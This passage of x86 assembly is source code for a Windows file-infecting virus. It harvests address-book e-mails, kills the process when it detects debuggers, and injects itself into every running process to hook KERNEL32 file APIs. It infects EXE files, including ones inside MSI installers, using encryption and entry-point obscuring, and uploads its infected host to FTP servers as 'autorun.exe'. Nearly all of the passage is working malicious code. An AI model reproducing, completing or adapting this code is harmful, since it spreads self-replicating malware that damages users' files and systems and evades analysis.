wlpFile = dword ptr $-4		;unmap view of file
	call	[ebp + a_UnmapViewOfFile - gdelta]
end_wmfile:
	push	12345678h
wMapFile = dword ptr $-4	;close file mapping object
	call	[ebp + a_CloseHandle - gdelta]
end_wfile:
	push	12345678h
wFile = dword ptr $-4		;close file
	call	[ebp + a_CloseHandle - gdelta]
	jmp	end_seh		;quit from procedure

next_wab:
	mov	esi,[ecx+60h]			;get to e-mail addresses array
	add	esi,ecx				;make RAW pointer
	lea	edi,[ebp + mails - gdelta]	;buffer for 5 mail addresses
	xor	ebx,ebx				;EBX - 0
	push	5
	pop	ecx				;ECX - 5
m_loop:	call	parse_wab			;get one e-mail address
	add	esi,44h				;get to next record
	loop	m_loop				;ECX timez
	jmp	end_wab				;and quit

parse_wab:
	push	ecx				;store registers
	push	esi				;...
	push	22h
	pop	ecx				;up to 22 characters
r_mail:	lodsw					;get unicode character
	stosb					;save ANSI character
	dec	ecx				;decrement counter
	test	al,al				;end of string?
	jne	r_mail				;no, continue
	add	edi,ecx				;yep, correct EDI
	pop	esi				;restore registers
	pop	ecx				;...
	ret					;and quit
wab_parse	EndP


;this procedure can check if the virus is debugged and if so, it can restart
;computer (Win98) or terminate current process (Win2k)

debug_stuff	Proc
	pushad

	mov	eax,fs:[20h]		;get debug context
	test	eax,eax			;if API-level debugger is not present,
	je	$+4			;EAX should be NULL
k_debug:int	19h			;kill process/computer :)

	call	[ebp + a_IsDebuggerPresent - gdelta]
	test	eax,eax			;check for API-level debugger
	jne	k_debug			;kill if present

	@getsz	'\\.\SICE',ebx		;name of driver to EBX
	call	Create_FileA		;open SOFTICE driver (Win98)
	inc	eax
	jne	k_debug			;kill if present

	@getsz	'\\.\NTICE',ebx		;name of driver to EBX
	call	Create_FileA		;open SOFTICE driber (WinNT/2k)
	inc	eax
	jne	k_debug			;kill if present

	popad				;restore registers
	ret				;and continue
debug_stuff	EndP


;this procedure is designed to infect ALL processes - in each process it will
;find K32, allocate memory for virus and hook some K32 calls
searchThread	Proc
	pushad					;store all registers
	@SEH_SetupFrame	<jmp	end_search>	;setup SEH frame
	mov	ebp,[esp.cPushad+12]		;get delta offset

	xor	ebx,ebx				;EBX - PID
	mov	ecx,80000h			;set counter
nextPID:inc	ebx				;increment PID
	pushad					;store all registers
	push	ebx				;process ID
	push	0
	push	PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION
						;try to get handle of process
	call	[ebp + a_OpenProcess - gdelta]	;thru our ID                 
	test	eax,eax				;have we correct handle?
	jne	gotPID				;yeah, ID is valid, infect process!
pid_loop:
	popad		   			;restore all registers
	loop	nextPID				;nope, try it with another ID
end_search:
	call	@patch
ep_patch	dd	0			;synchronize variable for
@patch:	pop	eax				;ExitProcess API
	mov	[eax],eax			;now, host program may be terminated
	jmp	end_seh				;quit

gotPID:	xchg	eax,ebx				;handle to EBX
	mov	esi,12345678h			;get K32 base
k32_base = dword ptr $-4

	;Now we have to get the size of K32 in another process. We use the trick
	;-> we will search thru the address space for the end of K32 in memory
	;and then we will substract the value with the base address, so we will
	;get the size
start_parse:
	push	mbi_size
	lea	eax,[ebp + mbi - gdelta]	;MBI structure
	push	eax
	push	esi
	push	ebx				;get informations about
	call	[ebp + a_VirtualQueryEx - gdelta]
	test	eax,eax				;adress space
	je	end_K32_patching		;quit if error
						;is memory commited?
	test	dword ptr [ebp + reg_state - gdelta],MEM_COMMIT
	je	end_parse			;quit if not, end of K32 found
	mov	eax,[ebp + reg_size - gdelta]	;get size of region
	add	[ebp + k32_size - gdelta],eax	;add the size to variable
	add	esi,eax				;make new address
	jmp	start_parse			;and parse again

end_parse:
	sub	esi,[ebp + k32_base - gdelta]	;correct to size and save it
	mov	[ebp + k32_size - gdelta],esi	;(size=k32_end - k32_start)

	push	PAGE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	esi
	push	0
	call	[ebp + a_VirtualAlloc - gdelta]	;allocate enough space
	test	eax,eax				;for K32 in our process
	je	end_K32_patching
	xchg	eax,edi
	mov	[ebp + k32_copy - gdelta],edi	;save the address

	lea	edx,[ebp + tmp - gdelta]
	push	edx
	push	12345678h
k32_size = dword ptr $-4
	push	edi
	push	dword ptr [ebp + k32_base - gdelta]
	push	ebx				;copy the K32 to our buffer
	call	[ebp + a_ReadProcessMemory - gdelta]
	dec	eax
	jne	end_K32_dealloc

	movzx	eax,word ptr [edi]		;get the first bytes of file
	add	eax,-"ZM"
	jne	end_K32_dealloc			;must be MZ header
	mov	esi,[edi.MZ_lfanew]		;get to PE header
	add	esi,edi
	mov	eax,[esi]
	add	eax,-"EP"
	jne	end_K32_dealloc				;must be PE header
	cmp	byte ptr [edi.MZ_res2],'H'+'I'+'V'	;is K32 already infected?
	je	end_K32_dealloc				;yeah, dont infect it again
	mov	byte ptr [edi.MZ_res2],'H'+'I'+'V'	;mark as already infected

	push	PAGE_EXECUTE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	virus_size
	push	0					;allocate enough space
	push	ebx					;for virus code in
	call	[ebp + a_VirtualAllocEx - gdelta]	;victim process
	test	eax,eax
	je	end_K32_dealloc				;quit if error
	mov	[ebp + virus_base - gdelta],eax		;save the address

;now we will try to hook some APIz of K32

	push	crcResCount
	pop	ecx					;count of APIz to hook
make_res:
	pushad						;store all registers
	mov	eax,edi
	lea	esi,[ebp + crcRes - gdelta + (ecx*4)-4]	;get API
	call	get_api					;get address of API
	test	eax,eax
	je	end_res					;quit if error
	push	eax
	mov	edx,[ebp + posRes - gdelta + (ecx*4)-4]	;get ptr to variable which
	sub	eax,[ebp + k32_copy - gdelta]		;holds the address to old
	add	eax,[ebp + k32_base - gdelta]		;API
	mov	[edx],eax				;store address there
	pop	eax					;get address to EAX

	pushad						;store all registers
	xchg	eax,esi					;EAX to ESI
	mov	edi,[ebp + oldRes - gdelta + (ecx*4)-4]	;save old 5 bytes
	movsd						;4 bytes
	movsb						;1 byte
	popad						;restore all registers

;overwrite first 5 bytes of API code by <JMP api_hooker> instruction
;address = dest_address - (jmp_address+5)

	push	eax
	sub	eax,[ebp + k32_copy - gdelta]	;calculate api_hooker address
	add	eax,[ebp + k32_base - gdelta]	;...
	mov	esi,eax				;...
	mov	eax,0				;base address of virus
virus_base = dword ptr $-4			;in memory
	add	eax,[ebp + newRes - gdelta + (ecx*4)-4]	;add address of api_hooker
	sub	eax,5				;substract the size of JMP
	sub	eax,esi				;substract with dest_address
	pop	esi
	mov	byte ptr [esi],0E9h		;write JMP opcode
	mov	[esi+1],eax			;write JMP address

end_res:popad					;restore all registers
	loop	make_res			;ECX-timez

	lea	edx,[ebp + tmp - gdelta]
	push	edx
	push	virus_size
	lea	edx,[ebp + Start - gdelta]
	push	edx
	push	dword ptr [ebp + virus_base - gdelta]
	push	ebx
	call	[ebp + a_WriteProcessMemory - gdelta]	;write virus to allocated memory
	dec	eax
	jne	end_K32_dealloc				;quit if error

	;now we will change protection of K32 memory so we will be able to
	;overwrite it with infected version of K32
	lea	edx,[ebp + tmp - gdelta]
	push	edx
	push	PAGE_EXECUTE_READWRITE
	push	dword ptr [ebp + k32_size - gdelta]
	push	dword ptr [ebp + k32_base - gdelta]
	push	ebx
	call	[ebp + a_VirtualProtectEx - gdelta]	;now we will be able to
	dec	eax					;rewrite the K32 with
	jne	end_K32_dealloc				;infected one

	lea	edx,[ebp + tmp - gdelta]
	push	edx
	push	dword ptr [ebp + k32_size - gdelta]
	push	dword ptr [ebp + k32_copy - gdelta]
	push	dword ptr [ebp + k32_base - gdelta]
	push	ebx
	call	[ebp + a_WriteProcessMemory - gdelta]	;rewrite K32

end_K32_dealloc:
	push	MEM_DECOMMIT
	push	dword ptr [ebp + k32_size - gdelta]
	push	12345678h
k32_copy = dword ptr $-4
	call	[ebp + a_VirtualFree - gdelta]	;now we have to decommit
						;our memory
	push	MEM_RELEASE
	push	0
	push	dword ptr [ebp + k32_copy - gdelta]
	call	[ebp + a_VirtualFree - gdelta]	;and de-reserve, now our
						;buffer doesnt exist
end_K32_patching:
	push	ebx
	call	[ebp + a_CloseHandle - gdelta]	;close the handle of process
	jmp	pid_loop			;and look for another one
searchThread	EndP


;new FindFirstFileA hooker
newFindFirstFileA	Proc
	pushad				;store all registers
	push	eax
	call	@oldFFA			;get pointer to saved bytes...
oldFindFirstFileA:
	db	5 dup (?)		;saved 5 bytes
@oldFFA:call	@newFFA
	db	5 dup (?)		;get pointer to buffer...
@newFFA:pop	edi
	mov	[esp+4],edi

	mov	esi,0			;address of FindFirstFileA in memory
posFindFirstFileA = dword ptr $-4
common_end:
	push	esi			;copy <JMP newFindFirstFileA> to
	movsd				;buffer
	movsb
	pop	edi
	pop	esi
	push	edi

	movsd				;restore previous 5 bytes of API code
	movsb
	sub	edi,5

	mov	esi,[esp.cPushad+16]
	push	esi
	push	dword ptr [esp.cPushad+16]
	call	edi			;call API
	inc	eax
	je	end_ffa
	dec	eax
	call	CheckInfect		;no error, try to infect found file
end_ffa:mov	[esp.Pushad_eax+8],eax
	pop	edi
	pop	esi
	movsd				;write back <JMP newFindFirstFileA>
	movsb
	popad				;restore all registers
	ret	8			;and quit with 2 params on the stack
newFindFirstFileA	EndP


;new FindNextFileA hooker
newFindNextFileA	Proc
	pushad				;store all registers
	push	eax
	call	@oldFNA			;get pointer to saved bytes...
oldFindNextFileA:
	db	5 dup (?)
@oldFNA:call	@newFNA			;get pointer to buffer...
	db	5 dup (?)
@newFNA:pop	edi
	mov	[esp+4],edi

	mov	esi,0			;address of FindNextFileA in memory
posFindNextFileA = dword ptr $-4
	jmp	common_end		;optimized :)
newFindNextFileA	EndP


;this procedure is used by API hookerz - it can create WFD structure and call
;CheckInfect procedure (this proc needs WFD struct)
xCheckInfect	Proc
	call	$+5
xdelta:	pop	ebp					;get delta offset
	lea	esi,[ebp + WFD - xdelta]
	push	esi					;WFD struct
	push	dword ptr [esp.cPushad+16]		;ptr to filename
	call	[ebp + a_FindFirstFileA - xdelta]	;find file
	inc	eax
	je	end_xci					;quit if error
	dec	eax
	call	CheckInfect				;infect file
	push	eax
	call	[ebp + a_FindClose - xdelta]		;close search handle
end_xci:ret						;and quit
xCheckInfect	EndP


;new CopyFileA hooker
newCopyFileA	Proc
	push	eax			;reserve space in stack for ret address
	pushad				;store all registers
	call	xCheckInfect		;check and infect file
	call	@oldCFA			;get pointer to saved bytes...
oldCopyFileA:
	db	5 dup (0)		;saved 5 bytes
@oldCFA:pop	esi			;...to ESI
	mov	edi,0			;address of CopyFileA in memory
posCopyFileA = dword ptr $-4
	mov	[esp.cPushad],edi	;store the address to stack
	movsd				;restore 5 bytes
	movsb
	popad				;restore all registers
	ret				;jump to previous API
newCopyFileA	EndP


;new MoveFileA hooker
newMoveFileA	Proc
	push	eax			;reserve space in stack for ret address
	pushad				;store all registers
	call	xCheckInfect		;check and infect file
	call	@oldMFA			;get pointer to saved bytes...
oldMoveFileA:
	db	5 dup (0)		;saved 5 bytes
@oldMFA:pop	esi			;...to ESI
	mov	edi,0			;address of MoveFileA in memory
posMoveFileA = dword ptr $-4
	mov	[esp.cPushad],edi	;store the address to stack
	movsd				;restore 5 bytes
	movsb
	popad				;restore all registers
	ret				;jump to previous API
newMoveFileA	EndP


;new CreateFileA handler
newCreateFileA	Proc
	push	eax			;reserve space in stack for ret address
	pushad				;store all registers
	mov	ecx,12345678h		;semaphore
cfa_patch = dword ptr $-4
	jecxz	no_cfa			;dont infect file in infection stage
	call	xCheckInfect		;check and infect file
no_cfa:	call	@oldCA			;get pointer to saved bytes...
oldCreateFileA:
	db	5 dup (0)		;saved 5 bytes
@oldCA:	pop	esi			;...to ESI
	mov	edi,0			;address of CreateFileA in memory
posCreateFileA = dword ptr $-4
	mov	[esp.cPushad],edi	;store the address to stack
	movsd				;restore 5 bytes
	movsb
	popad				;restore all registers
	ret				;jump to previous API
newCreateFileA	EndP


;new ExitProcess handler
newExitProcess	Proc
	pushad				;store all registers
	call	edelta			;get delta offset
edelta:	pop	ebp

ep_loop:mov	ecx,[ebp + ep_patch - edelta]	;wait for SearchThread
	jecxz	ep_loop				;termination...
	popad					;restore all registers
	j_api	oldExitProcess			;and call the original API
newExitProcess	EndP


;new InternetConnectA hooker
newInternetConnectA	Proc
	fld	dword ptr [esp]		;store return address on copro-stack
	call	ICAjmp			;call previous API

	push	eax			;make space on the stack
	fstp	dword ptr [esp]		;move return address from copro-stack to stack
	test	eax,eax			;error?
	jne	nICA			;no, we are connected
	ret				;yeah, quit

nICA:	pushad				;store all registers
	call	$+5
igd:	pop	ebp			;get delta offset to EBP

	xchg	eax,ebx

	push	MAX_PATH
	lea	esi,[ebp + reg_buffer - igd]
	push	esi
	push	0			;get path+filename of current process
	call	[ebp + a_GetModuleFileNameA - igd]

	lea	esi,[ebp + szInet+5 - igd]
	push	esi			;get base of WININET.DLL
	call	[ebp + a_GetModuleHandleA - igd]

	@pushsz	'FtpPutFileA'
	push	eax			;get address of FtpPutFileA API
	call	[ebp + a_GetProcAddress - igd]
	xchg	eax,ecx
	jecxz	endICA			;quit if error

	;now we will try to transfer infected file to FTP server
	push	0			;context
	push	2			;binary transfer
	@pushsz	'autorun.exe'		;dest filename
	push	esi			;source filename (our process)
	push	ebx			;handle to inet connection
	call	ecx			;call FtpPutFileA
endICA:	popad				;restore all registers
	ret				;and quit

ICAjmp:	pop	eax			;get code address
	mov	[esp],eax		;save it on the stack
	j_api	oldInternetConnectA	;and call the previous API
newInternetConnectA	EndP


unload_lib:
	push	edi
	call	[ebp + a_FreeLibrary - gd]


;this procedure can check the file and infect it
;input: ESI - WFD record
CheckInfect	Proc
	pushad				;store all registers
	@SEH_SetupFrame	<jmp	end_seh>;setup SEH frame
	call	gd
gd:	pop	ebp			;get delta offset to EBP

	mov	[ebp + cut_or_not - gd],ebp
					;set flag - truncate file back
	test	[esi.WFD_dwFileAttributes],FILE_ATTRIBUTE_DIRECTORY
	jne	end_seh			;must not be directory
	xor	edx,edx
	cmp	[esi.WFD_nFileSizeHigh],edx
	jne	end_seh			;discard huge files
	mov	edx,[esi.WFD_nFileSizeLow]
	cmp	edx,4000h		;discard small files
	jb	end_seh
	mov	[ebp + file_size - gd],edx
					;save file size
	lea	ebx,[esi.WFD_szFileName]

	pushad				;store all registers
	xor	esi,esi			;nulify register
	@pushsz	'SFC'
	call	[ebp + a_LoadLibraryA - gd]	;load SFC.dll library
	test	eax,eax
	je	q_sfc			;quit if error
	xchg	eax,edi

	@pushsz	'SfcIsFileProtected'
	push	edi
	call	[ebp + a_GetProcAddress - gd]
	test	eax,eax			;get the pointer to API
	je	un_sfc

	push	ebx			;filename
	push	0			;reserved
	call	eax			;call SfcIsFileProtected API
	test	eax,eax
	je	un_sfc
	inc	esi			;set variable to 1 if the file is protected
un_sfc:	call	unload_lib		;unload SFC.dll
q_sfc:	mov	[esp.Pushad_eax],esi	;save it to EAX on the stack
	popad				;restore all registerz
	test	eax,eax
	jne	end_seh			;quit if file is protected (EAX=0)

;	cmp	[ebx],'dcba'		;for debug version
;	jne	end_seh			;infect only "abcd" filez

	push	FILE_ATTRIBUTE_NORMAL
	push	ebx
	call	[ebp + a_SetFileAttributesA - gd]
	dec	eax			;blank file attributes
	jne	end_seh

	call	resCreate_FileA		;open file
	inc	eax
	je	end_attr		;quit if error
	dec	eax
	mov	[ebp + hFile - gd],eax	;save handle

	mov	ebx,[esi.WFD_nFileSizeLow]
	add	ebx,virus_size		;new file size to EBX
	mov	[ebp + mapped_file_size - gd],ebx
	cdq
	push	edx
	push	ebx
	push	edx
	push	PAGE_READWRITE
	push	edx
	push	eax
	call	[ebp + a_CreateFileMappingA - gd]
	xchg	eax,ecx			;create file mapping object
	jecxz	end_cfile		;quit if error
	mov	[ebp + hMapFile - gd],ecx
					;save handle
	push	ebx
	push	0
	push	0
	push	FILE_MAP_WRITE
	push	ecx
	call	[ebp + a_MapViewOfFile - gd]
	xchg	eax,ecx			;map view of file to our address space
	jecxz	end_mfile		;quit if error
	mov	[ebp + lpFile - gd],ecx	;save handle
	jmp	n_open			;and continue

end_file:
	popad
	push	12345678h
lpFile = dword ptr $-4			;unmap view of file
	call	[ebp + a_UnmapViewOfFile - gd]

end_mfile:
	push	12345678h
hMapFile = dword ptr $-4		;close file mapping object
	call	[ebp + a_CloseHandle - gd]

end_cfile:
	mov	ecx,12345678h		;infection succeed?
cut_or_not = dword ptr $-4
	jecxz	no_cut			;yeah, dont truncate file

	push	0			;no, truncate file back
	push	0
	push	dword ptr [esi.WFD_nFileSizeLow]
	push	dword ptr [ebp + hFile - gd]
	call	[ebp + a_SetFilePointer - gd]

	push	dword ptr [ebp + hFile - gd]
	call	[ebp + a_SetEndOfFile - gd]

no_cut:	lea	eax,[esi.WFD_ftLastWriteTime]
	push	eax
	lea	eax,[esi.WFD_ftLastAccessTime]
	push	eax
	lea	eax,[esi.WFD_ftCreationTime]
	push	eax			;set back file time
	push	dword ptr [ebp + hFile - gd]
	call	[ebp + a_SetFileTime - gd]

	mov	ecx,[ebp + cut_or_not - gd]
	jecxz	ntfs_stuff		;try to compress file and create new stream

close_file:
	push	12345678h
hFile = dword ptr $-4			;close file
	call	[ebp + a_CloseHandle - gd]

end_attr:
	lea	eax,[esi.WFD_szFileName]
	push	[esi.WFD_dwFileAttributes]
	push	eax			;set back file attributes
	call	[ebp + a_SetFileAttributesA - gd]

end_seh:@SEH_RemoveFrame		;remove SEH frame
	popad				;restore all registers
	ret				;and quit from procedure

;this procedure will try to NTFS-compress infected file and add new stream
ntfs_stuff	Proc
	push	0
	lea	eax,[ebp + tmp - gd]
	push	eax
	push	0
	push	0
	push	4
	call	in_buf
	dd	1				;default compression
in_buf:	push	09C040h				;compress code
	push	dword ptr [ebp + hFile - gd]
	call	[ebp + a_DeviceIoControl - gd]	;compress infected file!

	lea	esi,[esi.WFD_szFileName]	;get ptr to filename
	push	esi
	@endsz
	dec	esi
	mov	edi,esi
	mov	eax,'VIH:'
	stosd					;add there ":HIV"\0
	xor	al,al
	stosb
	pop	ebx
	mov	byte ptr [ebp + cfa_flagz - gd],CREATE_ALWAYS
	call	resCreate_FileA			;create new stream
	mov	byte ptr [ebp + cfa_flagz - gd],OPEN_EXISTING
	inc	eax
	je	end_seh				;quit if error
	dec	eax
	xchg	eax,ebx

	push	0
	lea	eax,[ebp + tmp - gd]
	push	eax
	push	szMsg-1-p_msg
	lea	eax,[ebp + p_msg - gd]
	push	eax
	push	ebx
	call	[ebp + a_WriteFile - gd]	;copy message to new stream

	push	ebx
	call	[ebp + a_CloseHandle - gd]	;close stream
	jmp	close_file			;and close whole file
ntfs_stuff	EndP


;this procedure can search for EXE files inside MSIs
mz_search	Proc
	pushad				;store all registers
	@SEH_SetupFrame <jmp	e_mz>	;setup SEH frame
r_byte:	movzx	eax,word ptr [ecx]	;get byte
	add	eax,-"ZM"		;is it MZ file?
	jne	n_byte			;no, explore next bytes
	mov	ebx,[ecx.MZ_lfanew]	;get to PE header
	add	ebx,ecx			;...
	mov	eax,[ebx]		;get DWORD
	add	eax,-"EP"		;is it PE file?
	jne	n_byte			;no, explore next bytes
end_mz:	mov	[esp.Pushad_ebx+8],ebx	;store PE location
	mov	[esp.Pushad_ecx+8],ecx	;store MZ location
	jmp	end_seh			;and quit
e_mz:	xor	ecx,ecx			;no file found...
	jmp	end_mz			;quit
n_byte:	inc	ecx			;move to next byte
	jmp	r_byte			;explore it
mz_search	EndP


check_msi:
	cmp	[ecx],0E011CFD0h	;is it MSI signature?
	jne	end_file		;no, quit
	cmp	[ecx+4],0E11AB1A1h	;is it MSI signature?
	jne	end_file		;no, quit

parse_msi:
	call	mz_search		;search for EXE file inside MSI
	test	ecx,ecx
	je	end_file		;no files found, quit...

	and	dword ptr [ebp + pe_or_msi - gd],0
	push	ecx			;set flag (EXE inside MSI) and store ECX
	call	m_open			;analyse and infect file
	pop	ecx			;restore ECX
c_msi:	inc	ecx			;try next EXE file
	jmp	parse_msi		;inside MSI...

n_open:	pushad						;store all registers
	mov	[ebp + pe_or_msi - gd],ecx		;set flag (normal EXE)
m_open:	movzx	eax,word ptr [ecx]			;get word
	add	eax,-"ZM"				;is it MZ?
	jne	check_msi				;no, quit
	cmp	byte ptr [ecx.MZ_res2],'H'+'I'+'V'	;is it already infected?
	je	end_file				;yeah, quit

	mov	ebx,ecx
	add	ebx,[ecx.MZ_lfanew]

;at this point:
;	EBX	-	start of PE header
;	ECX	-	start of MM file (MZ header)
;	ESI	-	WIN32_FIND_DATA record

	mov	eax,[ebx]			;get DWORD
	add	eax,-"EP"			;is it PE file?
	jne	end_file			;no, quit
	cmp	word ptr [ebx.NT_FileHeader.FH_Machine],IMAGE_FILE_MACHINE_I386
	jne	end_file			;must be 386+
	mov	eax,dword ptr [ebx.NT_FileHeader.FH_Characteristics]
	not	al
	test	ax,IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_DLL
	jne	end_file			;must not be DLL file
	movzx	edx,word ptr [ebx.NT_FileHeader.FH_NumberOfSections]
	cmp	edx,4
	jb	end_file			;must be 4+
	dec	edx
	imul	eax,edx,IMAGE_SIZEOF_SECTION_HEADER
	movzx	edx,word ptr [ebx.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea	edi,[eax+edx+IMAGE_SIZEOF_FILE_HEADER+4]
	add	edi,ebx

;at this point:
;	EBX	-	start of PE header
;	ECX	-	start of MZ header
;	EDX	-	start of host (.)code
;	ESI	-	WFD record
;	EDI	-	start of last section

	mov	byte ptr [ecx.MZ_res2],'H'+'I'+'V';mark as already infected
	mov	eax,12345678h
pe_or_msi = dword ptr $-4
	test	eax,eax				;do we infect MSI?
	je	infect_msi			;yeah, infect MSI
						;no, infect normal EXE
	mov	[ebp + file_base - gd],ecx	;save base of mapped file

	;EPO search engine

	pushad					;store all registers
	pushad					;...
	lea	edx,[edx+ebx+IMAGE_SIZEOF_FILE_HEADER+4]
	mov	esi,[edx.SH_PointerToRawData]	;get to start of .CODE section
	add	esi,ecx				;make RAW pointer
	mov	ecx,[edx.SH_SizeOfRawData]	;get the size of .CODE section

l_epo:	add	[ebp + enc_key - gd],eax;generate encryption key
	lodsd				;get byte
	cmp	eax,0C95B5E5Fh		;is it procedure epilog code?
	je	ll_epo			;yeah, check the last byte
	dec	esi			;no, decrement pointerz
	dec	esi			;...
	dec	esi			;...
	loop	l_epo			;search for next instructionz
	jmp	end_epo			;no epilog found, quit
ll_epo:	lodsb				;get the last byte
	cmp	al,0C3h			;is it RET instruction?
	je	got_epo			;yeah, we have found place for EPO
	sub	esi,4			;no, decrement pointerz
	dec	ecx			;and counter
	jmp	l_epo			;and try again

got_epo:mov	eax,[edi.SH_VirtualAddress]
	add	eax,[edi.SH_SizeOfRawData]	;calculate RVA of virus begining

	mov	ecx,esi
	sub	ecx,[esp.Pushad_ecx]
	sub	ecx,[edx.SH_PointerToRawData]
	add	ecx,[edx.SH_VirtualAddress]	;calculate RVA of JMP opcode
	or	dword ptr [edx.SH_Characteristics],IMAGE_SCN_MEM_WRITE
						;set WRITE flag to .CODE section
	mov	edi,esi
	mov	esi,ecx
	sub	esi,5
	sub	edi,5
	add	esi,[ebx.NT_OptionalHeader.OH_ImageBase]

	sub	eax,ecx				;calculate destination address
	push	eax

	mov	[ebp + epo_pos - gd],esi	;store EPO address
	mov	al,0E9h				;store JMP opcode
	stosb
	pop	eax
	stosd					;store JMP address

end_epo:popad					;restore all registers

	lea	eax,[ebp + image_base - gd]	;get pointer to variable
	push	dword ptr [eax]			;save variable to the stack
	mov	ecx,[ebx.NT_OptionalHeader.OH_ImageBase]
	mov	[eax],ecx			;save new image base of host

	lea	esi,[ebp + Start - gd]		;get start of virus to ESI
	mov	ecx,end_virus-Start		;size of virus code
	mov	eax,[edi.SH_PointerToRawData]	;get ptr to last section
	add	eax,[edi.SH_SizeOfRawData]	;add size of section
	add	eax,[esp.Pushad_ecx+4]		;add address of mapped file
	xchg	eax,edi				;save it to EDI
	push	edi				;store it to the stack

	mov	ebx,12345678h
enc_key = dword ptr $-4
	mov	[ebp + decr_key - gd],ebx	;save encryption key
	and	dword ptr [ebp + enc_key - gd],0;nulify encryption key variable

	inc	dword ptr [ebp + generation_count - gd]
						;increment number of generation
	call	mem_alloc			;allocate one buffer
	mov	[ebp + buffer - gd],eax		;save pointer
	call	mem_alloc			;allocate another buffer
	mov	[ebp + file_buffer - gd],eax	;save pointer

	mov	esi,12345678h			;get size of file
file_size = dword ptr $-4
	mov	ecx,8192
	sub	esi,ecx
	add	esi,12345678h			;move to the EOF-8192
file_base = dword ptr $-4
	mov	edi,12345678h			;EDI = allocated buffer
file_buffer = dword ptr $-4
	rep	movsb				;move there last 8192 bytes

	lea	esi,[ebp + encrypted - gd]	;start of encrypted part of virus
	mov	edi,12345678h
buffer = dword ptr $-4
	push	edi
	mov	ecx,(end_virus-encrypted+3)/4
	push	ecx                             ;copy encrypted part of virus
	rep	movsd                           ;to the buffer
	pop	ecx  
	pop	esi
	mov	edi,esi
encrpt:	lodsd
	xor	eax,ebx				;encrypt virus in the buffer
	stosd
	loop	encrpt
	pop	edi

	lea	esi,[ebp + Start - gd]
	push	encrypted-Start
	pop	ecx				;copy decryptor to the end of
	rep	movsb				;last section
	mov	esi,[ebp + buffer - gd]
	mov	ecx,8192-(encrypted-Start)
	rep	movsb				;copy the encrypted part of virus

	mov	ecx,8192
	mov	esi,[ebp + file_buffer - gd]
	rep	movsb				;and last 8192 of host code

	dec	dword ptr [ebp + generation_count - gd]	;decrement number of gen.
	pop	dword ptr [ebp + image_base - gd]	;restore image base
	popad					;restore all registers

	mov	esi,[ebp + buffer - gd]
	call	mem_dealloc			;deallocate buffer
	mov	esi,[ebp + file_buffer - gd]
	call	mem_dealloc			;...

	or	dword ptr [edi.SH_Characteristics],IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
						;set flagz of the last section
	add	dword ptr [edi.SH_VirtualSize],virus_size
	mov	eax,[edi.SH_VirtualSize]
	mov	ecx,[ebx.NT_OptionalHeader.OH_SectionAlignment]
	xor	edx,edx
	div	ecx
	test	edx,edx
	je	end_m1
	inc	eax
	mul	ecx
	mov	[edi.SH_VirtualSize],eax	;new virtual size

end_m1:	push	dword ptr [edi.SH_SizeOfRawData]
	add	dword ptr [edi.SH_SizeOfRawData],virus_size
	mov	eax,[edi.SH_SizeOfRawData]
	mov	ecx,[ebx.NT_OptionalHeader.OH_FileAlignment]
	xor	edx,edx
	div	ecx
	test	edx,edx
	je	end_m2
	inc	eax
end_m2:	mul	ecx
	pop	edx
	sub	eax,edx
	add	[ebx.NT_OptionalHeader.OH_SizeOfImage],eax
	test	dword ptr [edi.SH_Characteristics],IMAGE_SCN_CNT_INITIALIZED_DATA
	je	rs_ok			;new size of raw data
	add	[ebx.NT_OptionalHeader.OH_SizeOfInitializedData],eax
					;and size of initialized data
rs_ok:	cmp	dword ptr [ebx.NT_OptionalHeader.OH_CheckSum],0
	je	no_csum			;no need to calculate new checksum

	@pushsz	'Imagehlp'
@imghlp:call	[ebp + a_LoadLibraryA - gd]
	test	eax,eax			;load IMAGEHLP.DLL
	je	no_csum			;quit if error
	xchg	eax,edi

	@pushsz	'CheckSumMappedFile'
	push	edi
	call	[ebp + a_GetProcAddress - gd]
	test	eax,eax			;get address of CheckSumMappedFile API
	je	un_csum			;quit if error

	lea	ecx,[ebx.NT_OptionalHeader.OH_CheckSum]
	push	ecx			;where to store new checksum
	call	$+9
	dd	?			;old checksum
	push	12345678h		;size of infected file
mapped_file_size = dword ptr $-4
	push	dword ptr [ebp + lpFile - gd]
	call	eax			;calculate new checksum

un_csum:call	unload_lib		;unload library
no_csum:and	dword ptr [ebp + cut_or_not - gd],0
	jmp	end_file		;infection succeed, quit...


;this procedure can infect EXE file inside MSI
infect_msi:
;at this point:
;	EBX	-	start of PE header
;	ECX	-	start of MZ header
;	EDX	-	start of host (.)code
;	ESI	-	WFD record
;	EDI	-	start of last section

	mov	[ebp + r2rp - gd],ebx		;set !0 - victim program
	push	dword ptr [ebx.NT_OptionalHeader.OH_BaseOfCode]
	mov	eax,ecx
	call	rva2raw			;get base of code
	pop	esi
	mov	edi,esi
	mov	ecx,[ebx.NT_OptionalHeader.OH_SizeOfCode]
					;size of code
	include	cse.inc			;find cave inside EXE file

	push	edi
	mov	edi,[edx+ebx+IMAGE_SIZEOF_FILE_HEADER+4]
	cmp	edi,'xet.'		;is the first section ".text"?
	je	cc_msi
	cmp	edi,'EDOC'		;or ".CODE"?
	je	cc_msi
	pop	edi			;no, quit
	ret
cc_msi:	pop	edi
	mov	ecx,[ebx.NT_OptionalHeader.OH_AddressOfEntryPoint]
	mov	eax,ecx
	sub	eax,[ebx+edx+SH_VirtualAddress+IMAGE_SIZEOF_FILE_HEADER+4]
					;get entrypoint RVA to EAX
	push	eax
	mov	eax,ecx
	mov	[ebp + msi_entrypoint - gd],eax	;save old entrypoint
	mov	eax,[ebx.NT_OptionalHeader.OH_ImageBase]
	add	[ebp + msi_entrypoint - gd],eax	;in RAW format
	pop	eax

	push	esi
	sub	esi,edi
	sub	esi,eax				;set new entrypoint
	add	[ebx.NT_OptionalHeader.OH_AddressOfEntryPoint],esi
	pop	edi

	lea	esi,[ebp + msi_start - gd]
	mov	ecx,msi_end-msi_start
	rep	movsb				;copy there MSI bug-code
	ret					;end quit

no_cave_found:
	popad				;no cave inside EXE file found,
	ret				;restore all registers and quit
CheckInfect	EndP


;this procedure can allocate memory (8192 bytes)
mem_alloc:
	push	PAGE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	8192
	push	0
	call	[ebp + a_VirtualAlloc - gd]
	ret

;this procedure can deallocate already memory (8192 bytes)
mem_dealloc:
